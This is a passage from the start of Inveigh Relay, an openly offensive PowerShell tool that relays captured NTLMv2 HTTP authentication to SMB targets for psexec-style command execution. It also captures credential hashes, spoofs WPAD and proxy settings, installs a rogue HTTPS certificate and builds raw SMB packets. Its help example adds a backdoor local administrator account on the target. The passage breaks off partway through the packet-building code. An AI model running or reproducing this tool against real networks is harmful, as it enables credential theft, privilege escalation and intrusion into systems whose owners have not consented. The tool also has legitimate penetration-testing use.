function Invoke-InveighRelay
{
<#
.SYNOPSIS
Invoke-InveighRelay performs NTLMv2 HTTP to SMB relay with psexec style command execution.

.DESCRIPTION
Invoke-InveighRelay currently supports NTLMv2 HTTP to SMB1/SMB2 relay with psexec style command execution.

    HTTP/HTTPS to SMB NTLMv2 relay with granular control
    Supports SMB1 and SMB2 targets
    Does not require priveleged access on the Invoke-InveighRelay host
    The Invoke-InveighRelay host can be targeted for privilege escalation
    NTLMv1/NTLMv2 challenge/response capture over HTTP/HTTPS
    Granular control of console and file output

.PARAMETER Attack
Default = Execute: (Execute/Session) Attack to perform with relay. Execute performs PSExec style command execution. 
Session creates and maintains autneticated SMB sessions that can be interacted with through Invoke-TheHash's
Invoke-SMBClient and Invoke-SMBExec.

.PARAMETER Challenge
Default = Random: 16 character hex NTLM challenge for use with the HTTP listener. If left blank, a random
challenge will be generated for each request. Note that during SMB relay attempts, the challenge will be
pulled from the SMB relay target. 

.PARAMETER Command
Command to execute on SMB relay target. Use PowerShell character escapes where necessary.

.PARAMETER ConsoleOutput
Default = Disabled: (Low/Medium/Y/N) Enable/Disable real time console output. If using this option through a
shell, test to ensure that it doesn't hang the shell. Medium and Low can be used to reduce output.

.PARAMETER ConsoleQueueLimit
Default = Unlimited: Maximum number of queued up console log entries when not using the real time console.

.PARAMETER ConsoleStatus
(Integer) Interval in minutes for displaying all unique captured hashes and credentials. This is useful for
displaying full capture lists when running through a shell that does not have access to the support functions.

.PARAMETER ConsoleUnique
Default = Enabled: (Y/N) Enable/Disable displaying challenge/response hashes for only unique IP, domain/hostname,
and username combinations when real time console output is enabled.

.PARAMETER FileOutput
Default = Disabled: (Y/N) Enable/Disable real time file output.

.PARAMETER FileOutputDirectory
Default = Working Directory: Valid path to an output directory for log and capture files. FileOutput must also be
enabled.

.PARAMETER HTTP
Default = Enabled: (Y/N) Enable/Disable HTTP challenge/response capture.

.PARAMETER HTTPIP
Default = Any: IP address for the HTTP/HTTPS listener.

.PARAMETER HTTPPort
Default = 80: TCP port for the HTTP listener.

.PARAMETER HTTPS
Default = Disabled: (Y/N) Enable/Disable HTTPS challenge/response capture. Warning, a cert will be installed in
the local store. If the script does not exit gracefully, manually remove the certificate. This feature requires
local administrator access.

.PARAMETER HTTPSPort
Default = 443: TCP port for the HTTPS listener.

.PARAMETER HTTPSCertIssuer
Default = Inveigh: The issuer field for the cert that will be installed for HTTPS.

.PARAMETER HTTPSCertSubject
Default = localhost: The subject field for the cert that will be installed for HTTPS.

.PARAMETER HTTPSForceCertDelete
Default = Disabled: (Y/N) Force deletion of an existing certificate that matches HTTPSCertIssuer and
HTTPSCertSubject.

.PARAMETER HTTPResetDelay
Default = Firefox: Comma separated list of keywords to use for filtering browser user agents. Matching browsers
will have a delay before their connections are reset when Inveigh doesn't receive data. This can increase the
chance of capturing/relaying authentication through a popup box with some browsers (Firefox).

.PARAMETER HTTPResetDelayTimeout
Default = 30 Seconds: HTTPResetDelay timeout in seconds.

.PARAMETER LogOutput
Default = Enabled: (Y/N) Enable/Disable storing log messages in memory.

.PARAMETER MachineAccounts
Default = Disabled: (Y/N) Enable/Disable showing NTLM challenge/response captures from machine accounts.

.PARAMETER OutputStreamOnly
Default = Disabled: Enable/Disable forcing all output to the standard output stream. This can be helpful if
running Inveigh Relay through a shell that does not return other output streams. Note that you will not see the
various yellow warning messages if enabled.

.PARAMETER ProxyRelay
Default = Disabled: (Y/N): Enable/Disable relaying proxy authentication.

.PARAMETER ProxyIP
Default = Any: IP address for the proxy listener.

.PARAMETER ProxyPort
Default = 8182: TCP port for the proxy listener.

.PARAMETER ProxyIgnore
Default = Firefox: Comma separated list of keywords to use for filtering browser user agents. Matching browsers
will not be sent the wpad.dat file used for capturing proxy authentications. Firefox does not work correctly
with the proxy server failover setup. Firefox will be left unable to connect to any sites until the proxy is
cleared. Remove "Firefox" from this list to attack Firefox. If attacking Firefox, consider setting
-SpooferRepeat N to limit attacks against a single target so that victims can recover Firefox connectivity by
closing and reopening.

.PARAMETER RelayAutoDisable
Default = Enable: (Y/N) Enable/Disable automaticaly disabling SMB relay after a successful command execution on
target.

.PARAMETER RelayAutoExit
Default = Enable: (Y/N) Enable/Disable automaticaly exiting after a relay is disabled due to success or error.

.PARAMETER RunTime
(Integer) Run time duration in minutes.

.PARAMETER Service
Default = 20 Character Random: Name of the service to create and delete on the target.

.PARAMETER ShowHelp
Default = Enabled: (Y/N) Enable/Disable the help messages at startup.

.PARAMETER SMB1
(Switch) Force SMB1. The default behavior is to perform SMB version negotiation and use SMB2 if supported by the
target.

.PARAMETER StartupChecks
Default = Enabled: (Y/N) Enable/Disable checks for in use ports and running services on startup.

.PARAMETER StatusOutput
Default = Enabled: (Y/N) Enable/Disable startup and shutdown messages.

.PARAMETER Target
IP address of system to target for SMB relay.

.PARAMETER Tool
Default = 0: (0/1/2) Enable/Disable features for better operation through external tools such as Meterpreter's
PowerShell extension, Metasploit's Interactive PowerShell Sessions payloads and Empire.
0 = None, 1 = Metasploit/Meterpreter, 2 = Empire 

.PARAMETER Username
Default = All Usernames: Comma separated list of usernames to use for relay attacks. Accepts both username and
domain\username format. 

.PARAMETER WPADAuth
Default = NTLM: (Anonymous/NTLM) HTTP/HTTPS server authentication type for wpad.dat requests. Setting to
Anonymous can prevent browser login prompts.

.PARAMETER WPADAuthIgnore
Default = Firefox: Comma separated list of keywords to use for filtering browser user agents. Matching browsers
will be skipped for NTLM authentication. This can be used to filter out browsers like Firefox that display login
popups for authenticated wpad.dat requests such as Firefox.  

.EXAMPLE
Invoke-Inveigh -HTTP N
Invoke-InveighRelay -Target 192.168.2.55 -Command "net user Inveigh Spring2017 /add && net localgroup administrators Inveigh /add"

.LINK
https://github.com/Kevin-Robertson/Inveigh
#>

# Parameter default values can be modified in this section:
[CmdletBinding()]
param
( 
    [parameter(Mandatory=$false)][Array]$HTTPResetDelay = "Firefox",
    [parameter(Mandatory=$false)][Array]$ProxyIgnore = "Firefox",
    [parameter(Mandatory=$false)][Array]$Username = "",
    [parameter(Mandatory=$false)][Array]$UsernameAlwaysAllow = "Administrator",
    [parameter(Mandatory=$false)][Array]$WPADAuthIgnore = "",
    [parameter(Mandatory=$false)][Int]$ConsoleQueueLimit = "-1",
    [parameter(Mandatory=$false)][Int]$ConsoleStatus = "",
    [parameter(Mandatory=$false)][Int]$HTTPPort = "80",
    [parameter(Mandatory=$false)][Int]$HTTPSPort = "443",
    [parameter(Mandatory=$false)][Int]$HTTPResetDelayTimeout = "30",
    [parameter(Mandatory=$false)][Int]$ProxyPort = "8492",
    [parameter(Mandatory=$false)][Int]$RunTime = "",
    [parameter(Mandatory=$false)][Int]$SessionLimit = "2",
    [parameter(Mandatory=$false)][Int]$SessionRefresh = "10",
    [parameter(Mandatory=$false)][Object]$Source,
    [parameter(Mandatory=$false)][String]$Command = "",
    [parameter(Mandatory=$false)][String]$HTTPSCertIssuer = "Inveigh",
    [parameter(Mandatory=$false)][String]$HTTPSCertSubject = "localhost",
    [parameter(Mandatory=$false)][String]$Service,
    [parameter(Mandatory=$true)][Array]$Target = "",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$ConsoleUnique = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$FileOutput = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$FileUnique = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$HTTP = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$HTTPS = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$HTTPSForceCertDelete = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$LogOutput = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$MachineAccounts = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$OutputStreamOnly = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$Proxy = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$RelayAutoDisable = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$RelayAutoExit = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$SessionPriority = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$SigningCheck = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$ShowHelp = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$StartupChecks = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$StatusOutput = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N","Low","Medium")][String]$ConsoleOutput = "N",
    [parameter(Mandatory=$false)][ValidateSet("0","1","2")][String]$Tool = "0",
    [parameter(Mandatory=$false)][ValidateSet("Session","Execute")][String]$Attack = "Execute",
    [parameter(Mandatory=$false)][ValidateSet("Anonymous","NTLM")][String]$WPADAuth = "NTLM",
    [parameter(Mandatory=$false)][ValidateScript({Test-Path $_})][String]$FileOutputDirectory = "",
    [parameter(Mandatory=$false)][ValidatePattern('^[A-Fa-f0-9]{16}$')][String]$Challenge = "",
    [parameter(Mandatory=$false)][Switch]$SMB1,
    [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$HTTPIP = "0.0.0.0",
    [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$ProxyIP = "0.0.0.0",
    [parameter(ValueFromRemainingArguments=$true)]$invalid_parameter
)

if ($invalid_parameter)
{
    Write-Output "[-] $($invalid_parameter) is not a valid parameter."
    throw
}

$inveigh_version = "1.4 Dev"

if($ProxyIP -eq '0.0.0.0')
{ 
    $proxy_WPAD_IP = (Test-Connection 127.0.0.1 -count 1 | Select-Object -ExpandProperty Ipv4Address)
}

if($Attack -eq 'Execute' -and !$Command)
{
    Write-Output "[-] -Command requiried with -Attack Execute"
    throw
}
elseif($Attack -eq 'Session' -and $SMB1)
{
    Write-Output "[-] -SMB1 not suppported with -Attack Session"
    throw
}

if(!$FileOutputDirectory)
{ 
    $output_directory = $PWD.Path
}
else
{
    $output_directory = $FileOutputDirectory
}

if(!$inveigh)
{
    $global:inveigh = [HashTable]::Synchronized(@{})
    $inveigh.cleartext_list = New-Object System.Collections.ArrayList
    $inveigh.IP_capture_list = New-Object System.Collections.ArrayList
    $inveigh.log = New-Object System.Collections.ArrayList
    $inveigh.NTLMv1_list = New-Object System.Collections.ArrayList
    $inveigh.NTLMv1_username_list = New-Object System.Collections.ArrayList
    $inveigh.NTLMv2_list = New-Object System.Collections.ArrayList
    $inveigh.NTLMv2_username_list = New-Object System.Collections.ArrayList
    $inveigh.POST_request_list = New-Object System.Collections.ArrayList
    $inveigh.relay_list = New-Object System.Collections.ArrayList
    $inveigh.relay_user_failed_list = New-Object System.Collections.ArrayList
    $inveigh.valid_host_list = New-Object System.Collections.ArrayList
    $inveigh.requested_host_list = New-Object System.Collections.ArrayList
    $inveigh.requested_host_IP_list = New-Object System.Collections.ArrayList
    $inveigh.DNS_list = New-Object System.Collections.ArrayList
    $inveigh.session_list = @()
    $inveigh.session_socket_table = [HashTable]::Synchronized(@{})
    $inveigh.session_table = [HashTable]::Synchronized(@{})
    $inveigh.session_message_ID_table = [HashTable]::Synchronized(@{})
    $inveigh.session_lock_table = [HashTable]::Synchronized(@{})
    $inveigh.session_count = 0
}

if($inveigh.relay_running)
{
    Write-Output "[-] Inveigh Relay is already running"
    throw
}

if(!$inveigh.running)
{
    $inveigh.cleartext_file_queue = New-Object System.Collections.ArrayList
    $inveigh.console_queue = New-Object System.Collections.ArrayList
    $inveigh.HTTP_challenge_queue = New-Object System.Collections.ArrayList
    $inveigh.log_file_queue = New-Object System.Collections.ArrayList
    $inveigh.NTLMv1_file_queue = New-Object System.Collections.ArrayList
    $inveigh.NTLMv2_file_queue = New-Object System.Collections.ArrayList
    $inveigh.output_queue = New-Object System.Collections.ArrayList
    $inveigh.POST_request_file_queue = New-Object System.Collections.ArrayList
    $inveigh.status_queue = New-Object System.Collections.ArrayList
    $inveigh.console_input = $true
    $inveigh.console_output = $false
    $inveigh.file_output = $false
    $inveigh.HTTPS_existing_certificate = $false
    $inveigh.HTTPS_force_certificate_delete = $false
    $inveigh.log_output = $true
    $inveigh.cleartext_out_file = $output_directory + "\Inveigh-Cleartext.txt"
    $inveigh.log_out_file = $output_directory + "\Inveigh-Log.txt"
    $inveigh.NTLMv1_out_file = $output_directory + "\Inveigh-NTLMv1.txt"
    $inveigh.NTLMv2_out_file = $output_directory + "\Inveigh-NTLMv2.txt"
    $inveigh.POST_request_out_file = $output_directory + "\Inveigh-FormInput.txt"
}

$inveigh.target_list = New-Object System.Collections.ArrayList

ForEach($target_entry in $Target)
{
    $inveigh.target_list.Add($target_entry) > $null
}

if($StartupChecks -eq 'Y')
{

    $firewall_status = netsh advfirewall show allprofiles state | Where-Object {$_ -match 'ON'}

    if($HTTP -eq 'Y')
    {
        $HTTP_port_check = netstat -anp TCP | findstr LISTENING | findstr /C:"$HTTPIP`:$HTTPPort "
    }

    if($HTTPS -eq 'Y')
    {
        $HTTPS_port_check = netstat -anp TCP | findstr LISTENING | findstr /C:"$HTTPIP`:$HTTPSPort "
    }

    if($Proxy -eq 'Y')
    {
        $proxy_port_check = netstat -anp TCP | findstr LISTENING | findstr /C:"$HTTPIP`:$ProxyPort "
    }

}

$inveigh.relay_running = $true
$inveigh.SMB_relay = $true

if($StatusOutput -eq 'Y')
{
    $inveigh.status_output = $true
}
else
{
    $inveigh.status_output = $false
}

if($OutputStreamOnly -eq 'Y')
{
    $inveigh.output_stream_only = $true
}
else
{
    $inveigh.output_stream_only = $false
}

if($Tool -eq 1) # Metasploit Interactive PowerShell Payloads and Meterpreter's PowerShell Extension
{
    $inveigh.tool = 1
    $inveigh.output_stream_only = $true
    $inveigh.newline = ""
    $ConsoleOutput = "N"
}
elseif($Tool -eq 2) # PowerShell Empire
{
    $inveigh.tool = 2
    $inveigh.output_stream_only = $true
    $inveigh.console_input = $false
    $inveigh.newline = ""
    $LogOutput = "N"
    $ShowHelp = "N"

    switch ($ConsoleOutput)
    {

        'Low'
        {
            $ConsoleOutput = "Low"
        }

        'Medium'
        {
            $ConsoleOutput = "Medium"
        }

        default
        {
            $ConsoleOutput = "Y"
        }

    }

}
else
{
    $inveigh.tool = 0
    $inveigh.newline = ""
}

if($inveigh.running)
{
    $inveigh.output_pause = $true
}

# Write startup messages
$inveigh.output_queue.Add("[*] Inveigh Relay $inveigh_version started at $(Get-Date -format s)") > $null

if($firewall_status)
{
    $inveigh.output_queue.Add("[!] Windows Firewall = Enabled")  > $null
}

if($HTTP -eq 'Y')
{

    if($HTTP_port_check)
    {
        $HTTP = "N"
        $inveigh.output_queue.Add("[-] HTTP Capture/Relay Disabled Due To In Use Port $HTTPPort")  > $null
    }
    else
    {
        $inveigh.output_queue.Add("[+] HTTP Capture/Relay = Enabled")  > $null

        if($HTTPIP)
        {
            $inveigh.output_queue.Add("[+] HTTP IP Address = $HTTPIP") > $null
        }

        if($HTTPPort -ne 80)
        {
            $inveigh.output_queue.Add("[+] HTTP Port = $HTTPPort") > $null
        }
    }

}
else
{
    $inveigh.output_queue.Add("[+] HTTP Capture/Relay = Disabled")  > $null
}

if($HTTPS -eq 'Y')
{

    if($HTTPS_port_check)
    {
        $HTTPS = "N"
        $inveigh.HTTPS = $false
        $inveigh.output_queue.Add("[-] HTTPS Capture/Relay Disabled Due To In Use Port $HTTPSPort")  > $null
    }
    else
    {

        try
        {
            $inveigh.certificate_issuer = $HTTPSCertIssuer
            $inveigh.certificate_CN = $HTTPSCertSubject
            $inveigh.output_queue.Add("[+] HTTPS Certificate Issuer = " + $inveigh.certificate_issuer)  > $null
            $inveigh.output_queue.Add("[+] HTTPS Certificate CN = " + $inveigh.certificate_CN)  > $null
            $certificate_check = (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Issuer -match $inveigh.certificate_issuer})

            if(!$certificate_check)
            {
                # credit to subTee for cert creation code from Interceptor
                $certificate_distinguished_name = new-object -com "X509Enrollment.CX500DistinguishedName"
                $certificate_distinguished_name.Encode( "CN=" + $inveigh.certificate_CN, $certificate_distinguished_name.X500NameFlags.X500NameFlags.XCN_CERT_NAME_STR_NONE)
                $certificate_issuer_distinguished_name = new-object -com "X509Enrollment.CX500DistinguishedName"
                $certificate_issuer_distinguished_name.Encode("CN=" + $inveigh.certificate_issuer, $certificate_distinguished_name.X500NameFlags.X500NameFlags.XCN_CERT_NAME_STR_NONE)
                $certificate_key = new-object -com "X509Enrollment.CX509PrivateKey"
                $certificate_key.ProviderName = "Microsoft Enhanced RSA and AES Cryptographic Provider"
                $certificate_key.KeySpec = 2
                $certificate_key.Length = 2048
			    $certificate_key.MachineContext = 1
                $certificate_key.Create()
                $certificate_server_auth_OID = new-object -com "X509Enrollment.CObjectId"
			    $certificate_server_auth_OID.InitializeFromValue("1.3.6.1.5.5.7.3.1")
			    $certificate_enhanced_key_usage_OID = new-object -com "X509Enrollment.CObjectIds.1"
			    $certificate_enhanced_key_usage_OID.add($certificate_server_auth_OID)
			    $certificate_enhanced_key_usage_extension = new-object -com "X509Enrollment.CX509ExtensionEnhancedKeyUsage"
			    $certificate_enhanced_key_usage_extension.InitializeEncode($certificate_enhanced_key_usage_OID)
			    $certificate = new-object -com "X509Enrollment.CX509CertificateRequestCertificate"
			    $certificate.InitializeFromPrivateKey(2,$certificate_key,"")
			    $certificate.Subject = $certificate_distinguished_name
			    $certificate.Issuer = $certificate_issuer_distinguished_name
			    $certificate.NotBefore = (get-date).AddDays(-271)
			    $certificate.NotAfter = $certificate.NotBefore.AddDays(824)
			    $certificate_hash_algorithm_OID = New-Object -ComObject X509Enrollment.CObjectId
			    $certificate_hash_algorithm_OID.InitializeFromAlgorithmName(1,0,0,"SHA256")
			    $certificate.HashAlgorithm = $certificate_hash_algorithm_OID
                $certificate.X509Extensions.Add($certificate_enhanced_key_usage_extension)
                $certificate_basic_constraints = new-object -com "X509Enrollment.CX509ExtensionBasicConstraints"
			    $certificate_basic_constraints.InitializeEncode("true",1)
                $certificate.X509Extensions.Add($certificate_basic_constraints)
                $certificate.Encode()
                $certificate_enrollment = new-object -com "X509Enrollment.CX509Enrollment"
			    $certificate_enrollment.InitializeFromRequest($certificate)
			    $certificate_data = $certificate_enrollment.CreateRequest(0)
                $certificate_enrollment.InstallResponse(2,$certificate_data,0,"")
                $inveigh.certificate = (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Issuer -match $inveigh.certificate_issuer})
                $inveigh.HTTPS = $true
                $inveigh.output_queue.Add("[+] HTTPS Capture/Relay = Enabled")  > $null
            }
            else
            {

                if($HTTPSForceCertDelete -eq 'Y')
                {
                    $inveigh.HTTPS_force_certificate_delete = $true
                }

                $inveigh.HTTPS_existing_certificate = $true
                $inveigh.output_queue.Add("[+] HTTPS Capture = Using Existing Certificate")  > $null
            }

        }
        catch
        {
            $HTTPS = "N"
            $inveigh.HTTPS = $false
            $inveigh.output_queue.Add("[-] HTTPS Capture/Relay Disabled Due To Certificate Error")  > $null
        }

    }

}
else
{
    $inveigh.output_queue.Add("[+] HTTPS Capture/Relay = Disabled")  > $null
}

if($HTTP -eq 'Y' -or $HTTPS -eq 'Y')
{

    if($Challenge)
    {
        $inveigh.output_queue.Add("[+] NTLM Challenge = $Challenge")  > $null
    }

    if($MachineAccounts -eq 'N')
    {
        $inveigh.output_queue.Add("[+] Machine Account Capture = Disabled") > $null
        $inveigh.machine_accounts = $false
    }
    else
    {
        $inveigh.machine_accounts = $true
    }

    $inveigh.output_queue.Add("[+] WPAD Authentication = $WPADAuth") > $null

    if($WPADAuth -eq "NTLM")
    {
        $WPADAuthIgnore = ($WPADAuthIgnore | Where-Object {$_ -and $_.Trim()})

        if($WPADAuthIgnore.Count -gt 0)
        {
            $inveigh.output_queue.Add("[+] WPAD NTLM Authentication Ignore List = " + ($WPADAuthIgnore -join ","))  > $null
        }

    }

    $HTTPResetDelay = ($HTTPResetDelay | Where-Object {$_ -and $_.Trim()})

    if($HTTPResetDelay.Count -gt 0)
    {
        $inveigh.output_queue.Add("[+] HTTP Reset Delay List = " + ($HTTPResetDelay -join ","))  > $null
        $inveigh.output_queue.Add("[+] HTTP Reset Delay Timeout = $HTTPResetDelayTimeout Seconds") > $null
    }

}

if($Proxy -eq 'Y')
{

    if($proxy_port_check)
    {
        $HTTP = "N"
        $inveigh.output_queue.Add("[+] Proxy Capture/Relay Disabled Due To In Use Port $ProxyPort")  > $null
    }
    else
    {
        $inveigh.output_queue.Add("[+] Proxy Capture/Relay = Enabled")  > $null
        $inveigh.output_queue.Add("[+] Proxy Port = $ProxyPort") > $null
        $ProxyPortFailover = $ProxyPort + 1
        $WPADResponse = "function FindProxyForURL(url,host){return `"PROXY $proxy_WPAD_IP`:$ProxyPort; PROXY $proxy_WPAD_IP`:$ProxyPortFailover; DIRECT`";}"
        $ProxyIgnore = ($ProxyIgnore | Where-Object {$_ -and $_.Trim()})

        if($ProxyIgnore.Count -gt 0)
        {
            $inveigh.output_queue.Add("[+] Proxy Ignore List = " + ($ProxyIgnore -join ","))  > $null
        }

    }

}

if($Target.Count -eq 1)
{
        $inveigh.output_queue.Add("[+] Relay Target = " + ($Target -join ",")) > $null
}
else
{
        $inveigh.output_queue.Add("[+] Relay Targets = " + ($Target -join ",")) > $null
}

if($Username)
{

    if($Username.Count -eq 1)
    {
        $inveigh.output_queue.Add("[+] Relay Username = " + ($Username -join ",")) > $null
    }
    else
    {
        $inveigh.output_queue.Add("[+] Relay Usernames = " + ($Username -join ",")) > $null
    }

}

if($RelayAutoDisable -eq 'Y')
{
    $inveigh.output_queue.Add("[+] Relay Auto Disable = Enabled") > $null
}
else
{
    $inveigh.output_queue.Add("[+] Relay Auto Disable = Disabled") > $null
}

if($RelayAutoExit -eq 'Y')
{
    $inveigh.output_queue.Add("[+] Relay Auto Exit = Enabled") > $null
}
else
{
    $inveigh.output_queue.Add("[+] Relay Auto Exit = Disabled") > $null
}

if($Service)
{
    $inveigh.output_queue.Add("[+] Relay Service = $Service") > $null
}

if($SMB1)
{
    $inveigh.output_queue.Add("[+] SMB Version = SMB1") > $null
    $SMB_version = 'SMB1'
}

if($ConsoleOutput -ne 'N')
{
    
    if($ConsoleOutput -eq 'Y')
    {
        $inveigh.output_queue.Add("[+] Real Time Console Output = Enabled")  > $null
    }
    else
    {
        $inveigh.output_queue.Add("[+] Real Time Console Output = $ConsoleOutput")  > $null
    }

    $inveigh.console_output = $true

    if($ConsoleStatus -eq 1)
    {
        $inveigh.output_queue.Add("[+] Console Status = $ConsoleStatus Minute")  > $null
    }
    elseif($ConsoleStatus -gt 1)
    {
        $inveigh.output_queue.Add("[+] Console Status = $ConsoleStatus Minutes")  > $null
    }

}
else
{

    if($inveigh.tool -eq 1)
    {
        $inveigh.output_queue.Add("[!] Real Time Console Output Disabled Due To External Tool Selection") > $null
    }
    else
    {
        $inveigh.output_queue.Add("[+] Real Time Console Output = Disabled") > $null
    }

}

if($ConsoleUnique -eq 'Y')
{
    $inveigh.console_unique = $true
}
else
{
    $inveigh.console_unique = $false
}

if($FileOutput -eq 'Y')
{
    $inveigh.output_queue.Add("[+] Real Time File Output = Enabled") > $null
    $inveigh.output_queue.Add("[+] Output Directory = $output_directory") > $null
    $inveigh.file_output = $true
}
else
{
    $inveigh.output_queue.Add("[+] Real Time File Output = Disabled") > $null
}

if($FileUnique -eq 'Y')
{
    $inveigh.file_unique = $true
}
else
{
    $inveigh.file_unique = $false
}

if($LogOutput -eq 'Y')
{
    $inveigh.log_output = $true
}
else
{
    $inveigh.log_output = $false
}

if($RunTime -eq 1)
{
    $inveigh.output_queue.Add("[+] Run Time = $RunTime Minute") > $null
}
elseif($RunTime -gt 1)
{
    $inveigh.output_queue.Add("[+] Run Time = $RunTime Minutes") > $null
}

if($ShowHelp -eq 'Y')
{
    $inveigh.output_queue.Add("[!] Run Stop-Inveigh to stop manually") > $null
        
    if($inveigh.console_output)
    {
        $inveigh.output_queue.Add("[*] Press any key to stop real time console output") > $null
    }

}

while($inveigh.output_queue.Count -gt 0)
{

    switch -Wildcard ($inveigh.output_queue[0])
    {

        {$_ -like "?`[`!`]*" -or $_ -like "?`[-`]*"}
        {

            if($inveigh.status_output -and $inveigh.output_stream_only)
            {
                Write-Output($inveigh.output_queue[0] + $inveigh.newline)
            }
            elseif($inveigh.status_output)
            {
                Write-Warning($inveigh.output_queue[0])
            }
            
            if($inveigh.file_output)
            {
                $inveigh.log_file_queue.Add($inveigh.output_queue[0]) > $null
            }

            if($inveigh.log_output)
            {
                $inveigh.log.Add($inveigh.output_queue[0]) > $null
            }

            $inveigh.output_queue.RemoveAt(0)
        }

        default
        {

            if($inveigh.status_output -and $inveigh.output_stream_only)
            {
                Write-Output($inveigh.output_queue[0] + $inveigh.newline)
            }
            elseif($inveigh.status_output)
            {
                Write-Output($inveigh.output_queue[0])
            }

            if($inveigh.file_output)
            {
                $inveigh.log_file_queue.Add($inveigh.output_queue[0]) > $null
            }

            if($inveigh.log_output)
            {
                $inveigh.log.Add($inveigh.output_queue[0]) > $null
            }

            $inveigh.output_queue.RemoveAt(0)
        }

    }

}

if($inveigh.running)
{
    $inveigh.output_pause = $false
}

# Begin ScriptBlocks

# Shared Basic Functions ScriptBlock
$shared_basic_functions_scriptblock =
{

    function DataLength2
    {
        param ([Int]$length_start,[Byte[]]$string_extract_data)

        $string_length = [System.BitConverter]::ToUInt16($string_extract_data[$length_start..($length_start + 1)],0)

        return $string_length
    }

    function DataLength4
    {
        param ([Int]$length_start,[Byte[]]$string_extract_data)

        $string_length = [System.BitConverter]::ToUInt32($string_extract_data[$length_start..($length_start + 3)],0)

        return $string_length
    }

    function DataToString
    {
        param ([Int]$string_start,[Int]$string_length,[Byte[]]$string_extract_data)

        $string_data = [System.BitConverter]::ToString($string_extract_data[$string_start..($string_start + $string_length - 1)])
        $string_data = $string_data -replace "-00",""
        $string_data = $string_data.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        $string_extract = New-Object System.String ($string_data,0,$string_data.Length)

        return $string_extract
    }

}

# Packet Functions ScriptBlock
$packet_functions_scriptblock =
{
    function ConvertFrom-PacketOrderedDictionary
    {
        param($packet_ordered_dictionary)

        ForEach($field in $packet_ordered_dictionary.Values)
        {
            $byte_array += $field
        }

        return $byte_array
    }

    function Get-ProcessIDArray
    {
        $process_ID = [System.Diagnostics.Process]::GetCurrentProcess() | Select-Object -expand id
        $process_ID = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($process_ID))
        [Byte[]]$process_ID_bytes = $process_ID.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}

        return $process_ID_bytes
    }


    #NetBIOS

    function New-PacketNetBIOSSessionService
    {
        param([Int]$packet_header_length,[Int]$packet_data_length)

        [Byte[]]$packet_netbios_session_service_length = [System.BitConverter]::GetBytes($packet_header_length + $packet_data_length)
        $packet_NetBIOS_session_service_length = $packet_netbios_session_service_length[2..0]

        $packet_NetBIOSSessionService = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_NetBIOSSessionService.Add("Message_Type",[Byte[]](0x00))
        $packet_NetBIOSSessionService.Add("Length",[Byte[]]($packet_netbios_session_service_length))

        return $packet_NetBIOSSessionService
    }

    #SMB1

    function New-PacketSMBHeader
    {
        param([Byte[]]$packet_command,[Byte[]]$packet_flags,[Byte[]]$packet_flags2,[Byte[]]$packet_tree_ID,[Byte[]]$packet_process_ID,[Byte[]]$packet_user_ID)

        $packet_process_ID = $packet_process_ID[0,1]

        $packet_SMBHeader = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMBHeader.Add("Protocol",[Byte[]](0xff,0x53,0x4d,0x42))
        $packet_SMBHeader.Add("Command",$packet_command)
        $packet_SMBHeader.Add("ErrorClass",[Byte[]](0x00))
        $packet_SMBHeader.Add("Reserved",[Byte[]](0x00))
        $packet_SMBHeader.Add("ErrorCode",[Byte[]](0x00,0x00))
        $packet_SMBHeader.Add("Flags",$packet_flags)
        $packet_SMBHeader.Add("Flags2",$packet_flags2)
        $packet_SMBHeader.Add("ProcessIDHigh",[Byte[]](0x00,0x00))
        $packet_SMBHeader.Add("Signature",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_SMBHeader.Add("Reserved2",[Byte[]](0x00,0x00))
        $packet_SMBHeader.Add("TreeID",$packet_tree_ID)
        $packet_SMBHeader.Add("ProcessID",$packet_process_ID)
        $packet_SMBHeader.Add("UserID",$packet_user_ID)
        $packet_SMBHeader.Add("MultiplexID",[Byte[]](0x00,0x00))

        return $packet_SMBHeader
    }

    function New-PacketSMBNegotiateProtocolRequest
    {
        param([String]$packet_version)

        if($packet_version -eq 'SMB1')
        {
            [Byte[]]$packet_byte_count = 0x0c,0x00
        }
        else
        {
            [Byte[]]$packet_byte_count = 0x22,0x00  
        }

        $packet_SMBNegotiateProtocolRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMBNegotiateProtocolRequest.Add("WordCount",[Byte[]](0x00))
        $packet_SMBNegotiateProtocolRequest.Add("ByteCount",$packet_byte_count)
        $packet_SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_BufferFormat",[Byte[]](0x02))
        $packet_SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_Name",[Byte[]](0x4e,0x54,0x20,0x4c,0x4d,0x20,0x30,0x2e,0x31,0x32,0x00))

        if($packet_version -ne 'SMB1')
        {
            $packet_SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_BufferFormat2",[Byte[]](0x02))
